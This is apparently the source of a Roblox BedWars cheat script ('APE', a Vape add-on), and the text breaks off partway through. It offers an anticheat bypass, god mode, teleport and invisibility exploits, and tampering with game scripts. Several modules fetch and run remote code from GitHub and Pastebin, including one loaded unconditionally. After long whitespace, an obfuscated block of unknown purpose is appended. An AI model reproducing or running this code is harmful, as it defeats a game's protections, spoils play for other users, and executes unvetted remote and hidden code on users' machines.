		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd~=1 then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,((table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring)else bl=1 end else if 2<bd then bn=bm(b)else bm=function(b)local bi,bk,cs,ct,cu,cv,cw,cx=0 while true do if bi<=5 then if bi<=2 then if bi<=0 then bk,cs=g,g else if bi~=2 then ct=bj(#b)else cu=256 end end else if bi<=3 then cv=bj(cu)else if 4<bi then cw=1 else for bj=0,(cu-1)do cv[bj]=bg(bj)end end end end else if bi<=8 then if bi<=6 then cx=function()local bj,cy,cz=0 while true do if bj<=2 then if bj<=0 then cy=bh(be(b,cw,cw),36)else if bj<2 then cw=(cw+1)else cz=bh(be(b,cw,(cw+cy-1)),36)end end else if bj<=3 then cw=(cw+cy)else if 4==bj then return cz else break end end end bj=bj+1 end end else if bi~=8 then bk=bg(cx())else ct[1]=bk end end else if bi<=9 then while(cw<#b and#a==d)do local a=cx()if cv[a]then cs=cv[a]else cs=(bk..be(bk,1,1))end cv[cu]=(bk..be(cs,1,1))ct[(#ct+1)],bk,cu=cs,cs,cu+1 end else if bi>10 then break else return bf(ct)end end end end bi=bi+1 end end end end else if bd<=5 then if 5~=bd then bo={}else c={k,y,s,q,l,m,i,w,o,j,u,x,nil,nil};end else if bd<=6 then bp=v else if bd~=8 then bq=bp(bo)else br,bs=1,(-10986+(function()local a,b,c,d=0 while true do if a<=1 then if a>0 then d=(function(q,s)local v=0 while true do if 0==v then q(s(q,q),s(q,(s and s)))else break end v=v+1 end end)(function(q,s)local v=0 while true do if v<=2 then if v<=0 then if(b>388)then return q end else if v>1 then c=((c-484)%49665)else b=(b+1)end end else if v<=3 then if(c%762)>=381 then return q(q(s,q),q(s,s))else return s end else if v~=5 then return q else break end end end v=v+1 end end,function(q,s)local v=0 while true do if v<=2 then if v<=0 then if(b>191)then return s end else if v~=2 then b=b+1 else c=(((c+305))%7771)end end else if v<=3 then if(((c%862))>431 or((c%862))==431)then return q else return s(s(q,q),q(s,s))end else if 4<v then break else return q(s(q,s),(q(s,s and q)and s(q,s)))end end end v=v+1 end end)else b,c=0,1 end else if 2<a then break else return c;end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if 9==bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c==0 then d=0 else for q=0,31 do local s=(a%2)local v=(b%2)if(s==0)then if(v==1)then b=(b-1)d=d+2^q end else a=a-1 if v==0 then d=(d+2^q)else b=(b-1)end end b=(b/2)a=(a/2)end end else if 2<c then break else return d end end c=c+1 end end end else if 12>bd then bv=function(a,b)local c=0 while true do if c~=1 then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0<a then b,c=bu(b,bs),bu(c,bs);else b,c=h(bn,br,br+2)end else if a<=2 then br=(br+2);else if a>3 then break else return(bv(c,8))+b;end end end a=a+1 end end end end else if bd<=14 then if bd~=14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 1>c then return p((a/2^b));else break end c=c+1 end end else if bd==16 then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if c~=1 then return((((a+b))-bu(a,b)))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd>18 then cc=function(a,b)local c=0 while true do if 1~=c then return(bz-ca((bz-a),(bz-b)))else break end c=c+1 end end else cb=bw()end else if 20<bd then ce=bw()else cd=function(a,b,c)local d=0 while true do if d~=1 then if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return c-c%1 else local b=(2^(b-1))return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end end end else if bd<=23 then if 23~=bd then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0==a then b,c,d,p=h(bn,br,br+3)else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if 4~=a then return((bv(p,24)+bv(d,16)+bv(c,8))+b);else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 1>a then b=bu(h(bn,br,br),cb)else br=br+1;end else if a>2 then break else return b;end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd<26 then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ci=(-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if 2>a then while true do if b<=10 then if(b<=4)then if b<=1 then if not(b==1)then c=40425 else d=236 end else if(b<=2)then p=960 else if(4>b)then q=1920 else s=33223 end end end else if(b<=7)then if b<=5 then v=2 else if not(7==b)then w=894 else x=201 end end else if(b<=8)then y=3 else if b~=10 then be=1330 else bf=5906 end end end end else if(b<=15)then if(b==12 or b<12)then if(11<b)then bh=665 else bg=617 end else if(b<13 or b==13)then bi=211 else if(b==14)then bj=33389 else bk=787 end end end else if(b==18 or b<18)then if(b==16 or b<16)then bs=1 else if(18>b)then bw=0 else by,bz=bw,bs end end else if(b<19 or b==19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs>1 then break else while true do if not(ct~=0)then ce(ce(cc,cc),cc(ce,ce))else break end ct=(ct+1)end end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 2~=cs then while true do if ct<=2 then if ct<=0 then if(by>bi)then local bi=bw while true do bi=(bi+bs)if not(not(bi==bs))then return ce else break end end end else if(1==ct)then by=(by+bs)else bz=(((bz-bk)%bj))end end else if ct<=3 then if(bz%be)<bh then local be=bw while true do be=((be+bs))if(not(be~=bs)or(be<bs))then bz=(bz*bg)%bf else if not(be~=y)then break else return ce(ce(ce,ce),(cc(ce,ce)and ce(cc,ce)))end end end else local be=bw while true do be=((be+bs))if not((be~=v))then break else return ce end end end else if(ct<5)then return ce else break end end end ct=ct+1 end else break end end cs=cs+1 end end,function(be,bf)local bg,bh=0 while true do if bg<=0 then bh=0 else if bg==1 then while true do if(bh<=2)then if(bh<=0)then if(by>x)then local x=bw while true do x=((x+bs))if not(not((x==v)))then break else return bf end end end else if not(bh~=1)then by=((by+bs))else bz=((bz+w)%s)end end else if(bh<=3)then if(((bz%q))>p)then local p=bw while true do p=((p+bs))if((p<bs or p==bs))then bz=(((bz*d)%c))else if not(not(not(p~=y)))then break else return bf(be(be,bf and be),bf(bf,be))end end end else local c=bw while true do c=((c+bs))if(c>bs)then break else return be end end end else if not(5==bh)then return be else break end end end bh=(bh+1)end else break end end bg=bg+1 end end)else if not(20~=b)then return bz;else break end end end end end b=(b+1)end else break end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if bd==27 then cj=((-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 0==a then b=409 else c=818 end else if 2<a then p=222 else d=28939 end end else if a<=5 then if 4==a then q=389 else s=38485 end else if a~=7 then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if a<9 then x=9454 else y=425 end else if a==10 then be=4509 else bf=442 end end else if a<=13 then if 13~=a then bg=292 else bh=3 end else if 15>a then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if 17~=a then bk=579 else bs=10108 end else if 19>a then bw=252 else by=908 end end else if a<=21 then if 21>a then bz=5205 else ca=470 end else if 22==a then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if a==24 then cs=18568 else ct=2 end else if 26==a then cu=1 else cv=421 end end else if a<=29 then if a<29 then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if de~=1 then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd(db and da,dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if(cx>cv)then local cv=cw while true do cv=((cv+cu))if(cv<ct)then return db else break end end end else if de==1 then cx=(cx+cu)else cy=(((cy+cc))%cs)end end else if de<=3 then if(((cy%ce)==by or(cy%ce)>by))then local by=cw while true do by=by+cu if((by==cu or by<cu))then cy=((cy-ca)%bz)else if not(not(by==ct))then return db(da(dc,da,da,(db and dc)),dc(db,db,da,(dc and dd)),dc(da,dd,da,dc),(da(dc,(dd and db),db and dc,da)and da((dc and dd),dc and da,dd,dc)))else break end end end else local by=cw while true do by=(by+cu)if not(not(by==ct))then break else return da end 